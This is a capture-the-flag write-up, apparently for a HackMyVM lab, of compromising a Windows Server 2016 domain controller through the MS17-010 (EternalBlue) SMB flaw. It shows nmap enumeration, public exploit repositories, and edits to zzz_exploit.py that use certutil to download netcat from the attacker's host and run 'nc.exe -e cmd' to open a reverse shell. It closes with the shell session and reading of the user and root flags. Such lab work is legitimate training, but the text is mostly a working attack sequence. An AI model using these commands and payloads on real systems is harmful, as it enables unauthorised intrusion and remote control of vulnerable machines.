@@ -1,1 +1,717 @@
+			ENUMERATION
+			
+
+---nmap---
+
+                                                                                
+┌──(root㉿kali)-[/home/okina]
+└─# nmap 10.0.2.15 -sS -sC -sV -A -T4 -p-  
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-02 17:01 +03
+Nmap scan report for zero.hmv (10.0.2.15)
+Host is up (0.00086s latency).
+Not shown: 65516 filtered tcp ports (no-response)
+PORT      STATE SERVICE      VERSION
+53/tcp    open  domain       Simple DNS Plus
+88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-06-03 00:02:55Z)
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: zero.hmv, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds Windows Server 2016 Standard Evaluation 14393 microsoft-ds (workgroup: ZERO)
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: zero.hmv, Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf       .NET Message Framing
+49666/tcp open  msrpc        Microsoft Windows RPC
+49667/tcp open  msrpc        Microsoft Windows RPC
+49670/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+49671/tcp open  msrpc        Microsoft Windows RPC
+49685/tcp open  msrpc        Microsoft Windows RPC
+49710/tcp open  msrpc        Microsoft Windows RPC
+MAC Address: 08:00:27:37:9D:9F (Oracle VirtualBox virtual NIC)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose|phone|specialized
+Running (JUST GUESSING): Microsoft Windows 2016|2012|2022|Phone|10|Vista|2008|7 (95%)
+OS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2008::sp1 cpe:/o:microsoft:windows_7
+Aggressive OS guesses: Microsoft Windows Server 2016 (95%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (91%), Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (87%), Microsoft Windows Phone 7.5 or 8.0 (87%), Microsoft Windows 10 1511 - 1607 (86%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (85%), Microsoft Windows Embedded Standard 7 (85%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 1 hop
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+|_clock-skew: mean: 12h19m55s, deviation: 4h02m29s, median: 9h59m54s
+| smb-os-discovery: 
+|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
+|   Computer name: DC01
+|   NetBIOS computer name: DC01\x00
+|   Domain name: zero.hmv
+|   Forest name: zero.hmv
+|   FQDN: DC01.zero.hmv
+|_  System time: 2024-06-02T17:03:47-07:00
+| smb2-time: 
+|   date: 2024-06-03T00:03:47
+|_  start_date: 2024-06-02T23:52:38
+|_nbstat: NetBIOS name: DC01, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:37:9d:9f (Oracle VirtualBox virtual NIC)
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: required
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.87 ms zero.hmv (10.0.2.15)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 188.78 seconds
+            
+
+
+--- we discover a domain name zero.hmv, I add it to my dns system ---
+
+
+--- I search the open port service names on the internet and find that 445 port that has the service 
+microsoft-ds has exploits that we can use. I go to hacktricks.com and find a scan I can run for that 
+service using a script ---
+
+
+
+--- Based on what I found on the hacktricks, I run another nmap scan but this time only on the port 
+445 and using a script ---
+
+
+                                                                                
+┌──(root㉿kali)-[/home/okina]
+└─# nmap --script "safe or smb-enum-*" -p 445 10.0.2.15
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-02 19:38 +03
+Pre-scan script results:
+| targets-asn: 
+|_  targets-asn.asn is a mandatory parameter
+| broadcast-dhcp-discover: 
+|   Response 1 of 1: 
+|     Interface: eth0
+|     IP Offered: 10.0.2.75
+|     Server Identifier: 10.0.2.3
+|     Subnet Mask: 255.255.255.0
+|     Router: 10.0.2.1
+|     Domain Name Server: 1.1.1.1, 8.8.8.8
+|_    Domain Name: home
+|_http-robtex-shared-ns: *TEMPORARILY DISABLED* due to changes in Robtex's API. See https://www.robtex.com/api/
+|_hostmap-robtex: *TEMPORARILY DISABLED* due to changes in Robtex's API. See https://www.robtex.com/api/
+|_eap-info: please specify an interface with -e
+| broadcast-igmp-discovery: 
+|   10.0.2.15
+|     Interface: eth0
+|     Version: 2
+|     Group: 224.0.0.251
+|     Description: mDNS (rfc6762)
+|   10.0.2.15
+|     Interface: eth0
+|     Version: 2
+|     Group: 224.0.0.252
+|     Description: Link-local Multicast Name Resolution (rfc4795)
+|_  Use the newtargets script-arg to add the results as targets
+Nmap scan report for zero.hmv (10.0.2.15)
+Host is up (0.00070s latency).
+
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+|_smb-enum-services: ERROR: Script execution failed (use -d to debug)
+MAC Address: 08:00:27:37:9D:9F (Oracle VirtualBox virtual NIC)
+
+Host script results:
+|_path-mtu: PMTU == 1500
+|_msrpc-enum: NT_STATUS_ACCESS_DENIED
+| smb-protocols: 
+|   dialects: 
+|     NT LM 0.12 (SMBv1) [dangerous, but default]
+|     2:0:2
+|     2:1:0
+|     3:0:0
+|     3:0:2
+|_    3:1:1
+| smb-enum-shares: 
+|   note: ERROR: Enumerating shares failed, guessing at common ones (NT_STATUS_ACCESS_DENIED)
+|   account_used: <blank>
+|   \\10.0.2.15\ADMIN$: 
+|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
+|     Anonymous access: <none>
+|   \\10.0.2.15\C$: 
+|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
+|     Anonymous access: <none>
+|   \\10.0.2.15\IPC$: 
+|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
+|     Anonymous access: READ
+|   \\10.0.2.15\NETLOGON: 
+|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
+|_    Anonymous access: <none>
+| smb2-capabilities: 
+|   2:0:2: 
+|     Distributed File System
+|   2:1:0: 
+|     Distributed File System
+|     Leasing
+|     Multi-credit operations
+|   3:0:0: 
+|     Distributed File System
+|     Leasing
+|     Multi-credit operations
+|   3:0:2: 
+|     Distributed File System
+|     Leasing
+|     Multi-credit operations
+|   3:1:1: 
+|     Distributed File System
+|     Leasing
+|_    Multi-credit operations
+| port-states: 
+|   tcp: 
+|_    open: 445
+|_ipidseq: Unknown
+| unusual-port: 
+|_  WARNING: this script depends on Nmap's service/version detection (-sV)
+|_nbstat: NetBIOS name: DC01, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:37:9d:9f (Oracle VirtualBox virtual NIC)
+|_clock-skew: mean: 12h19m59s, deviation: 4h02m29s, median: 9h59m59s
+| smb-os-discovery: 
+|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
+|   Computer name: DC01
+|   NetBIOS computer name: DC01\x00
+|   Domain name: zero.hmv
+|   Forest name: zero.hmv
+|   FQDN: DC01.zero.hmv
+|_  System time: 2024-06-02T19:39:08-07:00
+| smb-vuln-ms17-010: 
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk factor: HIGH
+|       A critical remote code execution vulnerability exists in Microsoft SMBv1
+|        servers (ms17-010).
+|           
+|     Disclosure date: 2017-03-14
+|     References:
+|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
+|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
+|_fcrdns: PASS (zero.hmv)
+| smb-mbenum: 
+|_  ERROR: Call to Browser Service failed with status = 2184
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2024-06-03T02:39:09
+|_  start_date: 2024-06-03T01:28:22
+| dns-blacklist: 
+|   SPAM
+|     all.spamrats.com - FAIL
+|_    l2.apews.org - FAIL
+| smb-security-mode: 
+|   account_used: <blank>
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: required
+
+Post-scan script results:
+| reverse-index: 
+|_  445/tcp: 10.0.2.15
+Nmap done: 1 IP address (1 host up) scanned in 87.39 seconds
+                        
+
+
+
+--- this section tells us ---
+
+
+Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143
+|     Risk factor: HIGH
+|       A critical remote code execution vulnerability exists in Microsoft SMBv1
+
+
+
+--- here we see the exploit CVE-2017-0143, I go to the github repository ---
+
+
+https://github.com/3ndG4me/AutoBlue-MS17-010
+
+
+
+--- download it and then following the instructions ---
+
+
+                                                                                                         
+┌──(root㉿kali)-[/opt]
+└─# cd AutoBlue-MS17-010 
+                                                                                                         
+┌──(root㉿kali)-[/opt/AutoBlue-MS17-010]
+└─# ls
+LICENSE             eternalblue_exploit10.py  listener_prep.sh  shellcode
+README.md           eternalblue_exploit7.py   mysmb.py          zzz_exploit.py
+eternal_checker.py  eternalblue_exploit8.py   requirements.txt
+                                                                                                         
+┌──(root㉿kali)-[/opt/AutoBlue-MS17-010]
+└─# python3 eternal_checker.py 10.0.2.15
+[*] Target OS: Windows Server 2016 Standard Evaluation 14393
+[!] The target is not patched
+=== Testing named pipes ===
+[+] Found pipe 'netlogon'
+[+] Found pipe 'lsarpc'
+[+] Found pipe 'samr'
+[*] Done
+             
+
+
+--- we found the pipe names which are logical connections, kinda like ftp sessions ---
+
+
+--- I couldn't get much from this exploit however, so I move on to another one I found ---
+
+
+
+https://github.com/worawit/MS17-010
+
+
+
+                                                                                                                 
+┌──(root㉿kali)-[/opt/MS17-010]
+└─# git clone https://github.com/worawit/MS17-010.git
+
+
+
+┌──(root㉿kali)-[/opt]
+└─# cd MS17-010 
+                                                                                                                 
+┌──(root㉿kali)-[/opt/MS17-010]
+└─# ls
+BUG.txt                  eternalblue_exploit8.py  eternalromance_leak.py  infoleak_uninit.py  zzz_exploit.py
+README.md                eternalblue_poc.py       eternalromance_poc.py   mysmb.py
+__pycache__              eternalchampion_leak.py  eternalromance_poc2.py  mysmb.pyc
+checker.py               eternalchampion_poc.py   eternalsynergy_leak.py  npp_control.py
+eternalblue_exploit7.py  eternalchampion_poc2.py  eternalsynergy_poc.py   shellcode
+                                  
+
+
+
+
+Note: This script uses python2.7 so I had to do some configurations for python2.7, the module impacket 
+was not found so had to download the module for the python2.7
+
+
+
+
+--- THE CONFIGURATION ---
+
+
+┌──(root㉿kali)-[/opt/MS17-010]
+└─# python2.7 -m pip --version             
+/usr/bin/python2.7: No module named pip
+                                                                                
+┌──(root㉿kali)-[/opt/MS17-010]
+└─# wget https://bootstrap.pypa.io/pip/2.7/get-pip.py
+--2024-06-03 13:19:47--  https://bootstrap.pypa.io/pip/2.7/get-pip.py
+Resolving bootstrap.pypa.io (bootstrap.pypa.io)... 151.101.0.175, 151.101.64.175, 151.101.128.175, ...
+Connecting to bootstrap.pypa.io (bootstrap.pypa.io)|151.101.0.175|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1908226 (1.8M) [text/x-python]
+Saving to: ‘get-pip.py’
+
+get-pip.py          100%[===================>]   1.82M  3.57MB/s    in 0.5s    
+
+2024-06-03 13:19:48 (3.57 MB/s) - ‘get-pip.py’ saved [1908226/1908226]
+
+                                                                   
+┌──(root㉿kali)-[/opt/MS17-010]
+└─# python2.7 get-pip.py      
+DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. pip 21.0 will drop support for Python 2.7 in January 2021. More details about Python 2 support in pip can be found at https://pip.pypa.io/en/latest/development/release-process/#python-2-support pip 21.0 will remove support for this functionality.
+Collecting pip<21.0
+  Downloading pip-20.3.4-py2.py3-none-any.whl (1.5 MB)
+     |████████████████████████████████| 1.5 MB 929 kB/s 
+Collecting wheel
+  Downloading wheel-0.37.1-py2.py3-none-any.whl (35 kB)
+Installing collected packages: pip, wheel
+Successfully installed pip-20.3.4 wheel-0.37.1
+                                                                                
+                                                                            
+┌──(root㉿kali)-[/opt/MS17-010]
+└─# python2.7 -m pip install --upgrade pip setuptools
+                                                                      
+┌──(root㉿kali)-[/opt/MS17-010]
+└─# sudo python2.7 -m pip install --upgrade pip setuptools
+                                                                                                                                                                                 
+
+                                                                  
+┌──(root㉿kali)-[/opt/MS17-010]
+└─# python2.7 -m pip install impacket==0.9.20
+
+
+
+--- THE END OF CONFIG ---
+
+
+
+
+
+
+
+--- After the configuration was complete we can run the checker.py file with this tool too find the pipe 
+names ---
+
+
+
+┌──(root㉿kali)-[/opt/MS17-010]
+└─# python2.7 checker.py 10.0.2.15         
+Target OS: Windows Server 2016 Standard Evaluation 14393
+The target is not patched
+
+=== Testing named pipes ===
+spoolss: STATUS_ACCESS_DENIED
+samr: Ok (64 bit)
+netlogon: Ok (64 bit)
+lsarpc: Ok (64 bit)
+browser: STATUS_ACCESS_DENIED
+
+
+
+
+
+--- then I change the content of zzz_exploit.py ---
+
+
+.
+.
+.
+.
+def smb_pwn(conn, arch):
+        #smbConn = conn.get_smbconnection()
+
+        #print('creating file c:\\pwned.txt on the target')
+        #tid2 = smbConn.connectTree('C$')
+        #fid2 = smbConn.createFile(tid2, '/pwned.txt')
+        #smbConn.closeFile(tid2, fid2)
+        #smbConn.disconnectTree(tid2)
+        #smb_send_file(smbConn, sys.argv[0], 'C', '/exploit.py')
+        service_exec(conn, r'cmd /c ping 10.0.2.54')
+        # Note: there are many methods to get shell over SMB admin session
+        # a simple method to get shell (but easily to be detected by AV) is
+        # executing binary generated by "msfvenom -f exe-service ..."
+.
+.
+.
+.
+
+
+
+--- we will test if we can ping ourselves using the exploit --- 
+
+
+
+--- go to another terminal and start your tcpdump ---
+
+                                                                                
+┌──(root㉿kali)-[/home/okina]
+└─# tcpdump -i eth0 icmp -v
+
+
+
+                                                                                                            
+┌──(root㉿kali)-[/opt/MS17-010]
+└─# python2.7 zzz_exploit.py 10.0.2.15 samr
+.
+.
+.
+.....
+Done
+
+
+
+
+--- if you see the packages, this means it works ---
+
+┌──(root㉿kali)-[/home/okina]
+└─# tcpdump -i eth0 icmp -v
+tcpdump: listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
+13:48:18.177458 IP (tos 0x0, ttl 128, id 1766, offset 0, flags [none], proto ICMP (1), length 60)
+    zero.hmv > kali: ICMP echo request, id 1, seq 5, length 40
+13:48:18.177486 IP (tos 0x0, ttl 64, id 56058, offset 0, flags [none], proto ICMP (1), length 60)
+    kali > zero.hmv: ICMP echo reply, id 1, seq 5, length 40
+13:48:19.204522 IP (tos 0x0, ttl 128, id 1768, offset 0, flags [none], proto ICMP (1), length 60)
+    zero.hmv > kali: ICMP echo request, id 1, seq 6, length 40
+13:48:19.204543 IP (tos 0x0, ttl 64, id 56074, offset 0, flags [none], proto ICMP (1), length 60)
+    kali > zero.hmv: ICMP echo reply, id 1, seq 6, length 40
+13:48:20.239815 IP (tos 0x0, ttl 128, id 1769, offset 0, flags [none], proto ICMP (1), length 60)
+    zero.hmv > kali: ICMP echo request, id 1, seq 7, length 40
+13:48:20.239838 IP (tos 0x0, ttl 64, id 56198, offset 0, flags [none], proto ICMP (1), length 60)
+    kali > zero.hmv: ICMP echo reply, id 1, seq 7, length 40
+13:48:21.258856 IP (tos 0x0, ttl 128, id 1770, offset 0, flags [none], proto ICMP (1), length 60)
+    zero.hmv > kali: ICMP echo request, id 1, seq 8, length 40
+13:48:21.258878 IP (tos 0x0, ttl 64, id 56310, offset 0, flags [none], proto ICMP (1), length 60)
+    kali > zero.hmv: ICMP echo reply, id 1, seq 8, length 40
+
+
+--- we see the packages from zero.hmv to our own machine, it works ---
+
+
+
+--- now we will get a reverse shell, send it to ourselves from using this script and open up a shell
+session ---  
+
+
+--- I go to this repo ---
+
+https://github.com/int0x33/nc.exe/blob/master/nc64.exe
+
+
+
+--- move the exe file to where my script is ---
+
+┌──(root㉿kali)-[/home/okina/Downloads]
+└─# mv nc64.exe /opt/MS17-010/nc64.exe    
+
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# rlwrap nc -lnvp 443     
+listening on [any] 443 ...
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# python3 -m http.server         
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+
+
+
+
+--- now we once again change the zzz_exploit.py file, we will upload our virus into the target ---
+
+def smb_pwn(conn, arch):
+        #smbConn = conn.get_smbconnection()
+
+        #print('creating file c:\\pwned.txt on the target')
+        #tid2 = smbConn.connectTree('C$')
+        #fid2 = smbConn.createFile(tid2, '/pwned.txt')
+        #smbConn.closeFile(tid2, fid2)
+        #smbConn.disconnectTree(tid2)
+        #smb_send_file(smbConn, sys.argv[0], 'C', '/exploit.py')
+        service_exec(conn, r'cmd /c certutil -f -urlcache -split http://10.0.2.54:8000/nc64.exe c:\\windows\\temp\\nc.exe')
+        # Note: there are many methods to get shell over SMB admin session
+        # a simple method to get shell (but easily to be detected by AV) is
+        # executing binary generated by "msfvenom -f exe-service ..."
+
+
+                                                                                                                                               
+┌──(root㉿kali)-[/opt/MS17-010]
+└─# python2.7 zzz_exploit.py 10.0.2.15 samr
+.
+.
+.
+....
+Done
+
+
+
+
+--- now we will change the file for the last time so we can activate the virus ---
+
+def smb_pwn(conn, arch):
+        #smbConn = conn.get_smbconnection()
+
+        #print('creating file c:\\pwned.txt on the target')
+        #tid2 = smbConn.connectTree('C$')
+        #fid2 = smbConn.createFile(tid2, '/pwned.txt')
+        #smbConn.closeFile(tid2, fid2)
+        #smbConn.disconnectTree(tid2)
+        #smb_send_file(smbConn, sys.argv[0], 'C', '/exploit.py')
+        service_exec(conn, r'cmd /c c:\\windows\\temp\\nc.exe -e cmd 10.0.2.54 443')
+        # Note: there are many methods to get shell over SMB admin session
+        # a simple method to get shell (but easily to be detected by AV) is
+        # executing binary generated by "msfvenom -f exe-service ..."
+
+
+--- now we will have a connection from the victim machine to ours ---
+
+
+┌──(root㉿kali)-[/opt/MS17-010]
+└─# python2.7 zzz_exploit.py 10.0.2.15 samr
+Target OS: Windows Server 2016 Standard Evaluation 14393
+.
+.
+.
+...
+Done
+
+
+
+
+			GAINING FOOTHOLD
+			
+
+┌──(root㉿kali)-[/home/okina]
+└─# rlwrap nc -lnvp 443     
+listening on [any] 443 ...
+connect to [10.0.2.54] from (UNKNOWN) [10.0.2.15] 49916
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>
+
+			
+--- we are finally in ---
+
+
+C:\Windows\system32>cd ..
+cd ..
+
+
+C:\Windows>cd ..
+cd ..
+
+
+
+C:\>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is E4E7-1761
+
+ Directory of C:\
+
+07/16/2016  06:18 AM    <DIR>          PerfLogs
+04/15/2024  07:04 AM    <DIR>          Program Files
+01/06/2017  08:09 PM    <DIR>          Program Files (x86)
+04/15/2024  07:34 AM    <DIR>          Users
+06/03/2024  02:04 PM    <DIR>          Windows
+               0 File(s)              0 bytes
+               5 Dir(s)  21,967,306,752 bytes free
+
+
+C:\>cd Users
+cd Users
+
+
+C:\Users>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is E4E7-1761
+
+ Directory of C:\Users
+
+04/15/2024  07:34 AM    <DIR>          .
+04/15/2024  07:34 AM    <DIR>          ..
+04/15/2024  07:04 AM    <DIR>          Administrator
+04/15/2024  07:04 AM    <DIR>          Public
+04/15/2024  07:34 AM    <DIR>          ruycr4ft
+               0 File(s)              0 bytes
+               5 Dir(s)  21,967,306,752 bytes free
+
+
+
+C:\Users>cd ruycr4ft
+cd ruycr4ft
+
+C:\Users\ruycr4ft>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is E4E7-1761
+
+ Directory of C:\Users\ruycr4ft
+
+04/15/2024  07:34 AM    <DIR>          .
+04/15/2024  07:34 AM    <DIR>          ..
+04/15/2024  07:34 AM    <DIR>          Desktop
+04/15/2024  07:34 AM    <DIR>          Documents
+07/16/2016  06:18 AM    <DIR>          Downloads
+07/16/2016  06:18 AM    <DIR>          Favorites
+07/16/2016  06:18 AM    <DIR>          Links
+07/16/2016  06:18 AM    <DIR>          Music
+07/16/2016  06:18 AM    <DIR>          Pictures
+07/16/2016  06:18 AM    <DIR>          Saved Games
+07/16/2016  06:18 AM    <DIR>          Videos
+               0 File(s)              0 bytes
+              11 Dir(s)  21,967,306,752 bytes free
+
+C:\Users\ruycr4ft>cd Desktop
+cd Desktop
+
+C:\Users\ruycr4ft\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is E4E7-1761
+
+ Directory of C:\Users\ruycr4ft\Desktop
+
+04/15/2024  07:34 AM    <DIR>          .
+04/15/2024  07:34 AM    <DIR>          ..
+04/15/2024  07:34 AM                58 user.txt
+               1 File(s)             58 bytes
+               2 Dir(s)  21,967,306,752 bytes free
+
+
+C:\Users\ruycr4ft\Desktop>more user.txt
+more user.txt
+---First User Flag---
+
+
+
+
+C:\Users\ruycr4ft\Desktop>cd ..
+cd ..
+
+C:\Users\ruycr4ft>cd ..
+cd ..
+
+C:\Users>cd Administrator
+cd Administrator
+
+C:\Users\Administrator>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is E4E7-1761
+
+ Directory of C:\Users\Administrator
+
+04/15/2024  07:04 AM    <DIR>          .
+04/15/2024  07:04 AM    <DIR>          ..
+04/15/2024  07:04 AM    <DIR>          Contacts
+04/15/2024  07:32 AM    <DIR>          Desktop
+04/15/2024  07:04 AM    <DIR>          Documents
+04/15/2024  07:04 AM    <DIR>          Downloads
+04/15/2024  07:04 AM    <DIR>          Favorites
+04/15/2024  07:04 AM    <DIR>          Links
+04/15/2024  07:04 AM    <DIR>          Music
+04/15/2024  07:04 AM    <DIR>          Pictures
+04/15/2024  07:04 AM    <DIR>          Saved Games
+04/15/2024  07:04 AM    <DIR>          Searches
+04/15/2024  07:04 AM    <DIR>          Videos
+               0 File(s)              0 bytes
+              13 Dir(s)  21,967,306,752 bytes free
+
+C:\Users\Administrator>cd Desktop
+cd Desktop
+
+C:\Users\Administrator\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is E4E7-1761
+
+ Directory of C:\Users\Administrator\Desktop
+
+04/15/2024  07:32 AM    <DIR>          .
+04/15/2024  07:32 AM    <DIR>          ..
+04/15/2024  07:32 AM                76 root.txt
+               1 File(s)             76 bytes
+               2 Dir(s)  21,967,306,752 bytes free
+
+C:\Users\Administrator\Desktop>more root.txt
+more root.txt
+---Root User Flag---
+
 
